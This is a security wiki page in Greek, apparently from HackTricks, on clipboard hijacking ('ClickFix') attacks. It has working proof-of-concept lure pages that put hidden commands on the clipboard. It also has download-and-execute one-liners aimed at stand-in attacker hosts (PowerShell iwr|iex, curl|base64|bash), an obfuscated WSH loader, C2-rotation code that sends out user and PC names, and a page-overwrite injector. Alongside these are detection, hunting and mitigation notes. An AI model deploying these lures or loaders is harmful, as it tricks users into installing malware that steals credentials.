# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Μην επικολλάτε ποτέ κάτι που δεν αντιγράψατε οι ίδιοι." – παλιά αλλά ακόμα έγκυρη συμβουλή

## Επισκόπηση

Clipboard hijacking – επίσης γνωστό ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συστηματικά αντιγράφουν και επικολλούν εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη ιστοσελίδα (ή οποιοδήποτε περιβάλλον με υποστήριξη JavaScript όπως ένα Electron ή Desktop application) τοποθετεί προγραμματιστικά κείμενο ελεγχόμενο από τον επιτιθέμενο στο σύστημα του clipboard. Τα θύματα ενθαρρύνονται, συνήθως μέσω προσεκτικά σχεδιασμένων social-engineering οδηγιών, να πατήσουν **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ή να ανοίξουν ένα terminal και να *επικολλήσουν* το περιεχόμενο του clipboard, εκτελώντας άμεσα αυθαίρετες εντολές.

Επειδή **δεν γίνεται λήψη αρχείου και δεν ανοίγεται κάποιο attachment**, η τεχνική παρακάμπτει τους περισσότερους μηχανισμούς ασφαλείας σε e-mail και web-content που παρακολουθούν attachments, macros ή άμεση εκτέλεση εντολών. Η επίθεση είναι επομένως δημοφιλής σε phishing campaigns που διανέμουν κοινές οικογένειες malware όπως NetSupport RAT, Latrodectus loader ή Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Παλαιότερες καμπάνιες χρησιμοποιούσαν `document.execCommand('copy')`, οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).

## Ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται έναν typosquatted ή compromised site (π.χ. `docusign.sa[.]com`)
2. Το injected **ClearFake** JavaScript καλεί έναν helper `unsecuredCopyToClipboard()` που σιωπηλά αποθηκεύει ένα Base64-encoded PowerShell one-liner στο clipboard.
3. Οι HTML οδηγίες λένε στο θύμα: *«Πατήστε **Win + R**, επικολλήστε την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.»*
4. Το `powershell.exe` εκτελείται, κατεβάζοντας ένα archive που περιέχει ένα legitimate executable μαζί με ένα malicious DLL (classic DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον στάδια, κάνει injection shellcode και εγκαθιστά persistence (π.χ. scheduled task) – τελικά εκτελώντας NetSupport RAT / Latrodectus / Lumma Stealer.

### Παράδειγμα αλυσίδας NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά στον κατάλογό του το `msvcp140.dll`.
* Η κακόβουλη DLL επιλύει δυναμικά APIs με **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω **curl.exe**, τους αποκρυπτογραφεί χρησιμοποιώντας rolling XOR key `"https://google.com/"`, εισάγει το τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει `la.txt` με **curl.exe**
2. Εκτελεί τον JScript downloader μέσα στο **cscript.exe**
3. Κατεβάζει ένα MSI payload → τοποθετεί το `libcef.dll` δίπλα σε μια υπογεγραμμένη εφαρμογή → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η κλήση του **mshta** εκκινεί ένα κρυφό PowerShell script που ανακτά το `PartyContinued.exe`, αποσυμπιέζει το `Boat.pst` (CAB), ανασυνθέτει το `AutoIt3.exe` μέσω του `extrac32` και συνένωσης αρχείων, και τελικά εκτελεί ένα `.a3x` script που εξάγει διαπιστευτήρια του browser προς `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Ορισμένες καμπάνιες ClickFix παραλείπουν εντελώς τη λήψη αρχείων και ζητούν από τα θύματα να επικολλήσουν μια εντολή μίας γραμμής που ανακτά και εκτελεί JavaScript μέσω WSH, τη διατηρεί στο σύστημα και αλλάζει το C2 καθημερινά. Παρατηρημένη αλυσίδα παραδείγματος:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Key traits
- Θολωμένο URL αναστρέφεται κατά την εκτέλεση για να αποτρέψει πρόχειρη εξέταση.
- JavaScript διατηρεί την παρουσία του μέσω ενός Startup LNK (WScript/CScript), και επιλέγει το C2 με βάση την τρέχουσα ημέρα – επιτρέποντας γρήγορη εναλλαγή domain.

Minimal JS fragment used to rotate C2s by date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που επιτυγχάνει persistence και τραβάει ένα RAT (π.χ., PureHVNC), συχνά πραγματοποιώντας pinning TLS σε hardcoded πιστοποιητικό και chunking της κίνησης.

Detection ideas specific to this variant
- Δέντρο διεργασιών: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Στοιχεία εκκίνησης: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU και τηλεμετρία γραμμής εντολών που περιέχει `.split('').reverse().join('')` or `eval(a.responseText)`.
- Επαναλαμβανόμενες `powershell -NoProfile -NonInteractive -Command -` με μεγάλα stdin payloads για τροφοδότηση μεγάλων scripts χωρίς μεγάλες γραμμές εντολών.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2 hostnames και URLs που περιστρέφονται καθημερινά με pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συσχέτιση γεγονότων εγγραφής στο clipboard ακολουθούμενα από επικόλληση Win+R και άμεση εκτέλεση `powershell.exe`.

Οι Blue-teams μπορούν να συνδυάσουν clipboard, process-creation και registry τηλεμετρία για να εντοπίσουν κατάχρηση pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) όπου `ParentImage` == `explorer.exe` και `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων under `%LocalAppData%\Microsoft\Windows\WinX\` ή προσωρινά folders λίγο πριν το ύποπτο 4688 event.
* EDR clipboard sensors (if present) – συσχέτιση `Clipboard Write` ακολουθούμενο άμεσα από νέα PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Πρόσφατες καμπάνιες μαζικά παράγουν ψεύτικες CDN/browser verification σελίδες ("Just a moment…", IUAM-style) που αναγκάζουν χρήστες να αντιγράψουν OS-specific commands από το clipboard τους σε native κονσόλες. Αυτό μεταφέρει την εκτέλεση έξω από το browser sandbox και λειτουργεί σε Windows και macOS.

Key traits of the builder-generated pages
- Ανίχνευση OS μέσω `navigator.userAgent` για να προσαρμόσουν τα payloads (Windows PowerShell/CMD vs. macOS Terminal). Προαιρετικά decoys/no-ops για μη υποστηριζόμενα OS ώστε να διατηρηθεί η ψευδαίσθηση.
- Αυτόματη clipboard-copy σε benign UI actions (checkbox/Copy) ενώ το εμφανιζόμενο κείμενο μπορεί να διαφέρει από το περιεχόμενο του clipboard.
- Mobile blocking και ένα popover με βήμα-βήμα οδηγίες: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Προαιρετική obfuscation και single-file injector για να αντικαταστήσει το DOM ενός compromised site με Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS — διατήρηση μετά την αρχική εκτέλεση
- Χρησιμοποιήστε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχίζεται μετά το κλείσιμο του τερματικού, μειώνοντας τα ορατά ίχνη.

Κατάληψη σελίδας επί τόπου σε παραβιασμένους ιστότοπους
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ιδέες ανίχνευσης και hunting ειδικά για δελεαστικά τύπου IUAM
- Web: Σελίδες που δένουν το Clipboard API με widgets επαλήθευσης; ασυμφωνία μεταξύ του εμφανιζόμενου κειμένου και του clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace σε ύποπτα συμφραζόμενα.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από αλληλεπίδραση του browser; batch/MSI installers που εκτελούνται από `%TEMP%`.
- macOS endpoint: Terminal/iTerm που spawnάρει `bash`/`curl`/`base64 -d` με `nohup` κοντά σε γεγονότα του browser; background jobs που επιβιώνουν μετά το κλείσιμο του terminal.
- Συσχετίστε το `RunMRU` Win+R history και τις clipboard writes με την επακόλουθη δημιουργία console processes.

Δείτε επίσης για υποστηρικτικές τεχνικές

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Μέτρα μετριασμού

1. Browser hardening – απενεργοποιήστε την πρόσβαση εγγραφής στο clipboard (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαιτήστε user gesture.
2. Security awareness – εκπαιδεύστε τους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε έναν επεξεργαστή κειμένου.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για να μπλοκάρετε αυθαίρετες εντολές μίας γραμμής.
4. Network controls – μπλοκάρετε εξερχόμενα αιτήματα προς γνωστά pastejacking και malware C2 domains.

## Σχετικά Κόλπα

* **Discord Invite Hijacking** συχνά καταχράται την ίδια ClickFix προσέγγιση αφού δελεάσει χρήστες σε έναν κακόβουλο server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Αναφορές

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
